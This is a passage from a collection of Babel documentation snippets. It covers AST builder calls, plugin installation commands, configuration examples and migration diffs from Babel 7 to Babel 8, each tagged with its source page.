JavaScript\nCODE:\n```\nt.tsFunctionType(typeParameters, parameters, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Creating a TryStatement Node in JavaScript\nDESCRIPTION: This snippet illustrates how to create a `TryStatement` AST node using Babel's `t.tryStatement` method. It requires a block statement, and optionally a catch clause and a finalizer block statement.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_232\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tryStatement(block, handler, finalizer);\n```\n\n----------------------------------------\n\nTITLE: Virtual Methods with jQuery-like library (ES6)\nDESCRIPTION: This JavaScript (ES6) snippet demonstrates virtual methods with jquery-like library using .call, equivalent to ES7 example.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet _val;\n_val = document.querySelectorAll(\"div.myClass\");\n_val = find.call(_val, \"p\");\n_val = html.call(_val, \"hahaha\");\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeLiteral Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSTypeLiteral` AST node using Babel's `t.tsTypeLiteral` method. It requires an array of `TSTypeElement` members as its argument.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_213\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeLiteral(members);\n```\n\n----------------------------------------\n\nTITLE: Creating a Sequence Expression Node in Babel\nDESCRIPTION: Creates a `SequenceExpression` AST node using the Babel types module. This node represents a sequence expression, requiring an array of expressions.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_148\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.sequenceExpression(expressions);\n```\n\n----------------------------------------\n\nTITLE: Installing babel-jest using npm\nDESCRIPTION: This command installs babel-jest as a development dependency using npm. It ensures that babel-jest is available for transforming JavaScript and TypeScript files during the testing process. It is needed if you are transforming Typescript files with `babel-jest`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/jest/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev babel-jest\n```\n\n----------------------------------------\n\nTITLE: Enable function bind transformer\nDESCRIPTION: This Shell snippet shows how to enable the es7.functionBind transformer in Babel.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --optional es7.functionBind\n```\n\n----------------------------------------\n\nTITLE: Object Super Transformation Input (JavaScript)\nDESCRIPTION: Demonstrates the input JavaScript code using `super` within an object method, which will be transformed by the @babel/plugin-transform-object-super plugin. The object `obj2` calls the `say` method of its superclass. No dependencies are required.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-super.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nlet obj = {\n  say() {\n    return \"Hello\";\n  },\n};\n\nlet obj2 = {\n  say() {\n    return super.say() + \"World!\";\n  },\n};\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Closing Fragment in JavaScript\nDESCRIPTION: This snippet creates a `JSXClosingFragment` AST node using Babel's `t.jsxClosingFragment` builder. It requires no parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_95\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxClosingFragment();\n```\n\n----------------------------------------\n\nTITLE: Replace record/tuple syntax with polyfill factory calls\nDESCRIPTION: This code snippet demonstrates replacing record/tuple syntax with polyfill factory calls using `@bloomberg/record-tuple-polyfill`. It showcases the changes needed for both `hash` and `bar` syntax types, replacing special characters with `Record` and `Tuple` calls.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n+ import { Record, Tuple } from \"@bloomberg/record-tuple-polyfill\"\n\n// syntaxType: \"hash\"\n\n- #{ p: \"value\" }\n+ Record({ p: \"value\" })\n\n- #[0, 1, 2]\n+ Tuple(0, 1, 2)\n\n// syntaxType: \"bar\"\n- {| p: \"value\" |}\n+ Record({ p: \"value\" })\n\n- [|0, 1, 2|]\n+ Tuple(0, 1, 2)\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread SyntaxError (Diff)\nDESCRIPTION: This snippet illustrates a breaking change related to the object rest spread syntax. Trailing commas after a RestElement in objects are now a syntax error.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\nvar {\n-  ...y, // trailing comma is a SyntaxError\n+  ...y\n} = { a: 1 };\n```\n\n----------------------------------------\n\nTITLE: Installing Arrow Functions Plugin\nDESCRIPTION: Installs the `babel-plugin-transform-es2015-arrow-functions` plugin as a development dependency using npm. This plugin is required to transform ES2015 arrow functions into ES5 compatible code during the Babel compilation process.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install --save-dev babel-plugin-transform-es2015-arrow-functions\n```\n\n----------------------------------------\n\nTITLE: ES5 Property Mutators to ES5 defineProperties (JavaScript)\nDESCRIPTION: This example demonstrates how the plugin transforms ES5 getter/setter syntax into equivalent `Object.defineProperties` calls. It showcases a simple object `foo` with a getter and setter for the `bar` property, and the corresponding output after the transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-mutators.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = {\n  get bar() {\n    return this._bar;\n  },\n  set bar(value) {\n    this._bar = value;\n  },\n};\n```\n\n----------------------------------------\n\nTITLE: Adding Variance Node Type in JavaScript\nDESCRIPTION: This snippet demonstrates the addition of variance node type support with property variance annotations in Flow. It introduces type definitions using `type`, `interface`, `declare class`, and `class` with variance annotations (`+` for covariant, `-` for contravariant).\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ntype T = { +p: T };\ninterface T { -p: T };\ndeclare class T { +[k:K]: V };\nclass T { -[k:K]: V };\nclass C2 { +p: T = e };\n```\n\n----------------------------------------\n\nTITLE: Class Properties Usage with Babel JavaScript\nDESCRIPTION: Shows how to enable class property initializers in Babel using the `optional` or `stage` options within the `transform` function. It demonstrates two equivalent methods for enabling the feature.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"babel\").transform(\"code\", {\n  optional: [\"es7.classProperties\"]\n});\n// or\nrequire(\"babel\").transform(\"code\", { stage: 0 });\n```\n\n----------------------------------------\n\nTITLE: Unicode Support in JavaScript\nDESCRIPTION: Demonstrates the new Unicode support in ES2015, including new Unicode literal form in strings and new RegExp `u` mode to handle code points, as well as new APIs to process strings at the 21bit code points level. The example covers `String.length`, RegExp with `u` flag, unicode escape sequences, String ops, and iteration with for-of.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\n// same as ES5.1\n\"𠮷\".length == 2\n\n// new RegExp behaviour, opt-in ‘u’\n\"𠮷\".match(/./u)[0].length == 2\n\n// new form\n\"\\u{20BB7}\" == \"𠮷\"\n\"𠮷\" == \"\\uD842\\uDFB7\"\n\n// new String ops\n\"𠮷\".codePointAt(0) == 0x20BB7\n\n// for-of iterates code points\nfor(var c of \"𠮷\") {\n  console.log(c);\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Decorator Syntax (Old Proposal)\nDESCRIPTION: This code snippet demonstrates the old decorator syntax that allowed complex expressions as the body of a decorator. The `[...]` notation caused ambiguity between property access and computed names.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass MyClass {\n  @getDecorators().methods[name]\n  foo() {}\n\n  @decorator\n  [bar]() {}\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an ArrayTypeAnnotation Node\nDESCRIPTION: Creates an AST node representing an array type annotation. Requires the `elementType` parameter, which is a `FlowType`. Use `t.isArrayTypeAnnotation(node, opts)` to check if a node is an ArrayTypeAnnotation and `t.assertArrayTypeAnnotation(node, opts)` to assert that a node is an ArrayTypeAnnotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.arrayTypeAnnotation(elementType);\n```\n\n----------------------------------------\n\nTITLE: TSFunctionType AST (Babel 7)\nDESCRIPTION: Babel 7 AST for TSFunctionType, using `parameters` and `typeAnnotation`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_21\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSFunctionType\",\n  \"parameters\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"typeAnnotation\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Opening Fragment in JavaScript\nDESCRIPTION: This snippet creates a `JSXOpeningFragment` AST node using Babel's `t.jsxOpeningFragment` builder. It requires no parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_104\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxOpeningFragment();\n```\n\n----------------------------------------\n\nTITLE: @babel/eslint-plugin - Exports Object Change\nDESCRIPTION: This snippet illustrates how to import rules and rulesConfig from `@babel/eslint-plugin` in Babel 8. The `default` property is removed from the exports object, so direct import using `require()` is required. It addresses changes in how the ESLint plugin is accessed and extended. Dependencies: `@babel/eslint-plugin`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_74\n\nLANGUAGE: javascript\nCODE:\n```\n// Don't add `.default` after `require()`\nconst { rules, rulesConfig } = require(\"@babel/eslint-plugin\")\n```\n\n----------------------------------------\n\nTITLE: Transformed JavaScript Module String Names Example\nDESCRIPTION: This example shows the transformed output when using @babel/plugin-transform-modules-commonjs. It demonstrates how the module string name syntax is converted to CommonJS format. Note that this syntax is not transpiled to ES2015-style imports and exports.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-module-string-names.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst emojis = require(\"./emojis.js\");\nObject.defineProperty(exports, \"__esModule\", {\n  value: true,\n});\n\nexports[\"😄\"] = emojis.smile;\n```\n\n----------------------------------------\n\nTITLE: Decorator Auto Accessors in Babel 7\nDESCRIPTION: Shows how to utilize decorator auto accessors in Babel 7. This feature enables declarative property observation and modification.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_24\n\nLANGUAGE: javascript\nCODE:\n```\nclass Example { @reactive accessor myBool = false; }\n```\n\n----------------------------------------\n\nTITLE: Configuring babel-preset-minify with Options\nDESCRIPTION: This JSON configuration demonstrates how to pass options to the 'minify' preset within a babel.config.json file.  Specific options like `mangle.exclude`, `unsafe.typeConstructors`, and `keepFnName` are configured to customize the minification process.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [[\"minify\", {\n    \"mangle\": {\n      \"exclude\": [\"MyCustomError\"]\n    },\n    \"unsafe\": {\n      \"typeConstructors\": false\n    },\n    \"keepFnName\": true\n  }]]\n}\n```\n\n----------------------------------------\n\nTITLE: TSTypeParameter Migration Diff\nDESCRIPTION: This diff shows the required change when using `t.tsTypeParameter` due to the AST shape change in Babel 8, requiring wrapping the name string within the `identifier` builder.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_58\n\nLANGUAGE: diff\nCODE:\n```\n  t.tsTypeParameter(\n    /* constraint */ undefined,\n    /* default */ undefined,\n+   t.identifier(\n      name\n+   )\n  )\n```\n\n----------------------------------------\n\nTITLE: Creating a Switch Statement Node in Babel\nDESCRIPTION: Creates a `SwitchStatement` AST node using the Babel types module. This node represents a switch statement, requiring a discriminant expression and an array of cases.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_156\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.switchStatement(discriminant, cases);\n```\n\n----------------------------------------\n\nTITLE: Handling side effects in rest params index expressions (JavaScript)\nDESCRIPTION: This snippet fixes a bug where side effects in index expressions within rest parameters were happening more than once. This example makes sure that the increment operator only occurs once in the index calculation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction first(...values) {\n    let index = 0;\n    return values[index++]; // ++ was happening twice\n}\n\nconsole.log(first(1, 2));\n```\n\n----------------------------------------\n\nTITLE: Creating EnumStringMember in JavaScript\nDESCRIPTION: This snippet shows how to create an `EnumStringMember` AST node using Babel's `t.enumStringMember` method. The `id` parameter is a required `Identifier` representing the member's name, and `init` is a required `StringLiteral` representing the member's value. This node represents a single string-valued member within an enum.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_58\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumStringMember(id, init);\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/types\nDESCRIPTION: This command installs the @babel/types package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/types\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: This command installs the `babel-plugin-transform-remove-undefined` plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-undefined.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-remove-undefined --save-dev\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Decorators Before Export (Example)\nDESCRIPTION: Illustrates the debate about whether decorators should come before or after the `export` keyword in JavaScript.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport @decorator class MyClass {}\n\n// or\n\n@decorator\nexport class MyClass {}\n```\n\n----------------------------------------\n\nTITLE: Function Bind with document.querySelectorAll Equivalent JavaScript\nDESCRIPTION: Shows the equivalent JavaScript code of the previous example using `Array.prototype.map.call` and `Array.prototype.filter.call` to achieve the same result without using the function bind syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { map, filter } = Array.prototype;\n\nlet sslUrls = document.querySelectorAll(\"a\");\nsslUrls = map.call(sslUrls, node => node.href);\nsslUrls = filter.call(sslUrls, href => href.substring(0, 5) === \"https\");\n\nconsole.log(sslUrls);\n```\n\n----------------------------------------\n\nTITLE: Install Broccoli Babel Transpiler with npm\nDESCRIPTION: This command installs the `broccoli-babel-transpiler` package as a development dependency using npm.  The `--save-dev` flag ensures that the package is added to the `devDependencies` section of the `package.json` file.  This is typically used in projects that use Broccoli as a build tool and Babel for transpilation.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/broccoli/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev broccoli-babel-transpiler\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Node.js\nDESCRIPTION: This snippet shows how to switch from `node-jsx` to `babel/register` for JSX transformation in Node.js. It involves replacing the `require` statement.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire('node-jsx').install();\n```\n\n----------------------------------------\n\nTITLE: isIdentifierName Function Definition\nDESCRIPTION: This TypeScript code defines the `isIdentifierName` function, which checks if a given string is a valid JavaScript identifier name. It returns `true` if the string is a valid identifier name and `false` otherwise.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-validator-identifier.md#_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\nfunction isIdentifierName(name: string): boolean\n```\n\n----------------------------------------\n\nTITLE: JSON Module Import Compiled with uncheckedRequire (JavaScript)\nDESCRIPTION: This is the compiled output of the JSON module import when targeting CommonJS on Node.js with the `uncheckedRequire` option enabled in `@babel/plugin-proposal-json-modules`.  It simplifies the output by directly using `require`, skipping the JSON validation. Requires Node.js environment.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-07-26-7.25.0.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst myConfig = require(\"./config.json\");\n```\n\n----------------------------------------\n\nTITLE: Virtual Methods with jQuery-like library (ES7)\nDESCRIPTION: This JavaScript (ES7) snippet demonstrates function bind with a jquery-like library. It finds divs with a specific class name, then finds all p tags within them and replace their content using function bind operator ::\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Create bindings for just the methods that we need\nlet { find, html } = jake;\n\n// Find all the divs with class=\"myClass\", then get all of the\n// \"p\"s and replace their content.\ndocument.querySelectorAll(\"div.myClass\"):find(\"p\")::html(\"hahaha\");\n```\n\n----------------------------------------\n\nTITLE: Default Export Arrow Function JavaScript\nDESCRIPTION: Example of a default export with an arrow function. Fixes a bug related to exporting arrow functions correctly.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\n// this wasn't exporting correctly before\nexport default ({ onClick }) => {\n  return <div onClick={() => onClick()}></div>;\n}\n```\n\n----------------------------------------\n\nTITLE: Second Revision of replace-top-level-this-plugin (JS)\nDESCRIPTION: This revision improves the plugin by skipping traversal of `this` expressions within function declarations, function expressions, object methods, class methods and class private methods.  This avoids replacing `this` in inner scopes, but still uses a long string for the visitor keys.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nmodule.exports = (api) => {\n  const { types: t } = api;\n  return {\n    name: \"replace-top-level-this\",\n    visitor: {\n      ThisExpression(path) {\n        path.replaceWith(t.identifier(\"globalThis\"));\n      }\n      \"FunctionDeclaration|FunctionExpression|ObjectMethod|ClassMethod|ClassPrivateMethod\"(path) {\n        path.skip();\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TSTypeParameter AST (Babel 7)\nDESCRIPTION: This is the AST representation of a TSTypeParameter node in Babel 7. The `name` property is a string.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSTypeParameter\",\n  \"name\": \"T\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an UpdateExpression with Babel\nDESCRIPTION: Creates an `UpdateExpression` AST node using the `t.updateExpression` method. This node represents an update operation (e.g., `++`, `--`), where `operator` is the update operator, `argument` is the expression to update, and `prefix` indicates if the operator is prefix (default `false`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_244\n\nLANGUAGE: javascript\nCODE:\n```\nt.updateExpression(operator, argument, prefix);\n```\n\n----------------------------------------\n\nTITLE: Function.sent in Babel 8\nDESCRIPTION: Shows the use of function.sent property within Babel 8, related to generator functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\nfunction.sent\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Number Keyword\nDESCRIPTION: Creates a TypeScript `number` keyword node in the AST. Represents the `number` type in TypeScript. It doesn't take any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_196\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsNumberKeyword();\n```\n\n----------------------------------------\n\nTITLE: Spread Operator Deopt (JSX)\nDESCRIPTION: Example demonstrating a deopt caused by using the spread operator on JSX elements. Hoisting is not performed with spread attributes.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-constant-elements.md#_snippet_6\n\nLANGUAGE: JSX\nCODE:\n```\n<div {...foobar} />\n```\n\n----------------------------------------\n\nTITLE: Deprecated Import Assert in Babel 7\nDESCRIPTION: Demonstrates the deprecated import assert syntax (legacy import attributes) within Babel 7 for specifying module types. It associates metadata with import statements.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_26\n\nLANGUAGE: javascript\nCODE:\n```\nimport json from \"./foo.json\" assert { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: TSTypeQuery AST (Babel 7)\nDESCRIPTION: This is the AST representation of the TSTypeQuery node in Babel 7. The `exprName` is an Identifier node.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSTypeQuery\",\n  \"exprName\": { \"type\": \"Identifier\", \"name\": \"this\" }\n}\n```\n\n----------------------------------------\n\nTITLE: Async/Await Pipeline Desugaring (Initial Desugared)\nDESCRIPTION: This JavaScript snippet shows the desugared version of the initial `await` pipeline syntax. It demonstrates that `x |> await f` becomes `await f(x)`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nawait f(x)\n```\n\n----------------------------------------\n\nTITLE: TSMappedType Migration Example in TypeScript\nDESCRIPTION: This TypeScript example demonstrates how to migrate code using `t.tsMappedType` from Babel 7 to Babel 8, showing the change in argument order and structure.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_62\n\nLANGUAGE: typescript\nCODE:\n```\n// To create { [P in string as Q]: number }\n\n// Babel 7\nt.tsMappedType(\n  t.tsTypeParameter(t.tsStringKeyword(), undefined, \"P\"),\n  t.tsNumberKeyword(),\n  t.tsTypeReference(t.identifier(\"Q\"))\n)\n\n// Babel 8\nt.tsMappedType(\n  t.identifier(\"P\"),\n  t.tsStringKeyword(),\n  t.tsTypeReference(t.identifier(\"Q\")),\n  t.tsNumberKeyword()\n)\n```\n\n----------------------------------------\n\nTITLE: Creating a Record Expression Node in Babel\nDESCRIPTION: Creates a `RecordExpression` AST node using the Babel types module. This node represents a record expression, requiring an array of properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_144\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.recordExpression(properties);\n```\n\n----------------------------------------\n\nTITLE: Checking for Pure Expressions in JavaScript\nDESCRIPTION: This snippet uses `t.isPureish(node)` to check if an AST node represents a pure expression, meaning it has no side effects. It covers a variety of literal and function-related nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_290\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isPureish(node);\n```\n\n----------------------------------------\n\nTITLE: Migrating Experimental Option in Babel\nDESCRIPTION: This code snippet shows how to replace the removed `experimental` option in Babel v5 with the `--stage` flag or the `stage` option in the configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\n$ babel --stage 0\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin: Shell\nDESCRIPTION: This command line interface (CLI) command demonstrates how to run Babel with the `@babel/plugin-transform-reserved-words` plugin on a specific JavaScript file (script.js).\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-reserved-words.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-reserved-words script.js\n```\n\n----------------------------------------\n\nTITLE: Installation via npm\nDESCRIPTION: This command installs the `babel-plugin-minify-guarded-expressions` package as a development dependency using npm. The `--save-dev` flag ensures it's added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-guarded-expressions.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-guarded-expressions --save-dev\n```\n\n----------------------------------------\n\nTITLE: Transform RegExp Constructor (Output)\nDESCRIPTION: The output after applying the `transform-regexp-constructors` plugin.  The `RegExp` constructor is replaced with a regular expression literal.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-constructors.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = \"ab+\";\nvar a = /ab+c/i;\n```\n\n----------------------------------------\n\nTITLE: Using Async Do Expressions Plugin via CLI\nDESCRIPTION: This command shows how to use the @babel/plugin-syntax-async-do-expressions plugin with the Babel CLI. It transforms the script.js file using the specified plugin, enabling the parsing of async do expressions syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-do-expressions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-async-do-expressions script.js\n```\n\n----------------------------------------\n\nTITLE: Gemfile Configuration for Sprockets\nDESCRIPTION: This Gemfile snippet specifies the Ruby gems required for using Sprockets. It includes the 'sprockets' gem and the 'sprockets-bumble_d' gem, which are necessary for asset management and processing.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/sprockets/install.md#_snippet_0\n\nLANGUAGE: Ruby\nCODE:\n```\ngem \"sprockets\"\ngem \"sprockets-bumble_d\"\n```\n\n----------------------------------------\n\nTITLE: Plugin Installation via npm\nDESCRIPTION: This command installs the `@babel/plugin-transform-async-generator-functions` package as a development dependency using npm. This is a prerequisite for using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-generator-functions.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-async-generator-functions\n```\n\n----------------------------------------\n\nTITLE: Importing Core-js Polyfills (v2)\nDESCRIPTION: Illustrates how to import proposal polyfills individually from the core-js v2 package.  This is required after removing proposal polyfills from @babel/polyfill in Babel 7.  It shows the specific import paths for various stage proposals.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// for core-js v2:\nimport \"core-js/fn/array/flat-map\";\n```\n\n----------------------------------------\n\nTITLE: Fixing hoisting of JSX member expressions in `transform-react-constant-elements` - JavaScript\nDESCRIPTION: This code showcases a fix in `transform-react-constant-elements` that prevents hoisting JSX member expressions accessed through `this` outside of their function scope. The fix ensures that `this.component` is not hoisted to the top level because `this` would be undefined outside the function's context.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nfunction render() {\n  this.component = \"div\";\n  return () => <this.component />;\n}\n```\n\nLANGUAGE: javascript\nCODE:\n```\nfunction render() {\n  this.component = \"div\";\n\n  var _ref = <this.component />;\n\n  return () => _ref;\n}\n```\n\n----------------------------------------\n\nTITLE: Imports Hoisting: After Babel 5.x\nDESCRIPTION: Shows the execution order of imports after Babel 5.x, where imports are hoisted to the top of the file to comply with the ES6 specification. Notice `require('./test')` now appears before `global.test = 'test'`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_21\n\nLANGUAGE: javascript\nCODE:\n```\n'use strict';\n\nrequire('./test');\nglobal.test = 'test';\n```\n\n----------------------------------------\n\nTITLE: Super Node Migration Diff\nDESCRIPTION: This diff illustrates how to update code that uses `t.isExpression` or `t.assertsExpression` to also accept `Super` nodes when necessary.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_57\n\nLANGUAGE: diff\nCODE:\n```\n// Add `.foo` to an expression\n- if (t.isExpression(path.node)) {\n+ if (t.isExpression(path.node) || t.isSuper(path.node)) {\n  path.replaceWith(\n    t.memberExpression(\n      path.node,\n      t.identifier(\"foo\")\n    ))\n}\n```\n\n----------------------------------------\n\nTITLE: ObjectTypeIndexer Location Change\nDESCRIPTION: This code snippet illustrates the change in the location information for `ObjectTypeIndexer` nodes. The `end` property no longer includes the semicolon. This adjustment ensures consistency with the flow-parser.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n {\n   \"type\": \"ObjectTypeIndexer\",\n   \"start\": 9,\n-  \"end\": 29,\n+  \"end\": 28,\n   \"loc\": {\n     \"start\": {\n       \"line\": 1,\n       \"column\": 9,\n     },\n     \"end\": {\n       \"line\": 1,\n-      \"column\": 29\n+      \"column\": 28\n     }\n   }\n }\n```\n\n----------------------------------------\n\nTITLE: TSConstructorType AST (Babel 8)\nDESCRIPTION: Babel 8 AST for TSConstructorType, using `params` and `returnType`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_25\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSConstructorType\",\n  \"params\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"retutnType\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Module Attributes Dynamic Import JavaScript\nDESCRIPTION: This snippet demonstrates the use of module attributes with a dynamic `import()` statement. The `with` property allows specifying attributes like `type`. Note the trailing comma to improve maintainability.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst metadata = await import(\n  \"./package.json\",\n  { with: { type: \"json\" 